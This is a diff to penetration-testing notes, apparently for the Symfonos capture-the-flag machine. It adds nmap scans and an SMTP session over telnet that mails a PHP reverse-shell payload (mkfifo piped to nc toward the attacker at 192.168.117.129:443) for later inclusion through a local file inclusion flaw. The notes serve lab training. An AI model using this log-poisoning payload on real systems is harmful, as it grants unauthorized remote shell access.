@@ -12,6 +12,28 @@ nmap -sU -O -p- -oA udp 192.168.44.1
 nmap -sC -sV -p- 192.168.44.1
 nmap -p- -vv --script vuln,discovery 192.168.44.1
 
+# SMTP Port 25 (if found LFI)
+
+root@kali:~/Desktop# telnet 192.168.44.1 25
+Trying 192.168.44.1...
+Connected to 192.168.44.1.
+Escape character is '^]'.
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+helo .localdomain
+250 symfonos.localdomain
+mail from: helios@localdomain
+250 2.1.0 Ok
+rcpt to: helios
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.117.129 443 >/tmp/f"); ?>
+.
+250 2.0.0 Ok: queued as 8A633406E5
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
+
 # Udp port check
 nc -z -v -u 192.168.44.1 137
 192.168.1.99: inverse host lookup failed: Unknown host
